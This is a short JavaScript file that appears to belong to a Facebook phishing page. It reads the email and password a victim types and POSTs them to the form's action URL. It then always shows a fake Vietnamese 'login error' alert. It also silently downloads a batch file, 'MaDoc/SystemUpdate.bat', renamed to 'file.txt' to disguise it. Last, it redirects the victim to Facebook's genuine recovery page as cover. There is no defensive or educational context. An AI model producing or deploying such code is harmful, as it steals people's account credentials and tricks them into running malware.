const form = document.querySelector('form[name="Huy"]');

form.addEventListener('submit', e => {
    e.preventDefault();
    const email = form.querySelector('input[name="email"]').value;
    const password = form.querySelector('input[name="password"]').value;

  fetch(form.action, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      email: email,
      password: password
  })
  })
  .then(response => response.json())
  .then(data => {
    alert("Đã xảy ra lỗi khi xử lý thông tin đăng nhập. Vui lòng nhập lại email và password."); // Thông báo khi tài khoản không tồn tại

    // Tải file sau thông báo
    const link = document.createElement('a');
    link.href = 'MaDoc/SystemUpdate.bat'; // Thay đổi thành đường dẫn đến file của bạn
    link.download = 'file.txt'; // Tên file khi tải về
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link); 


    window.location.href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
  })
  .catch((error) => {
    console.error('Error:', error);
  });
});